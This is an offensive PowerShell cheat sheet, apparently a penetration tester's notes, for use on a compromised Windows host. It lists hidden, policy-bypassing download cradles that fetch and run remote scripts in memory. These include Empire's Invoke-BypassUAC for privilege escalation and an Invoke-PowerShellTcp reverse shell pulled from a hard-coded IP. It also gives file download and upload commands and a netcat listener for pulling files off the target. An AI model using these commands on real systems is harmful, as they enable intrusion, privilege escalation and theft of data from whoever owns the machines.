## Start up WebServer

## Run script in memory:
'''ps
powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object System.Net.WebClient).DownloadString('http://<LocalIPAddress>:<PORT>/FILE')

powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'
'''

# In PowerShell:
IEX((New-Object System.Net.WebClient).DownloadString('http://LocalIPAddress:PORT/FILE'))

=========================================

# Download File:
powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).DownloadFile('http://LocalIPAddress:PORT/FILE', 'LOCAL_FILENAME')

# In PowerShell:
(New-Object System.Net.WebClient).DownloadFile('http://LocalIPAddress:PORT/FILE', 'LOCAL_FILENAME')


=========================================

# Upload File:
powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).UploadFile('http://LocalIPAddress:PORT/FILE', 'LOCAL_FILENAME')

# In PowerShell:
(New-Object System.Net.WebClient).UploadFile('http://LocalIPAddress:PORT/FILE', 'LOCAL_FILENAME')

---------------
# If you can't copy over SMB
## On Local Box
nc -lnvp 443 > Out.File
## On Windows Box
Invoke-RestMethod -Uri http://<LocalIPAddress>:<PORT>/<FILE> -Method Post -InFile <LocalFile>

=========================================

## Upgrade PSH to 64-bit shell
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).DownloadString('http://192.168.119.187:80/Invoke-PowerShellTcp.ps1')

C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object Net.Webclient).DownloadString('http://192.168.119.187:80/Invoke-PowerShellTcp.ps1')
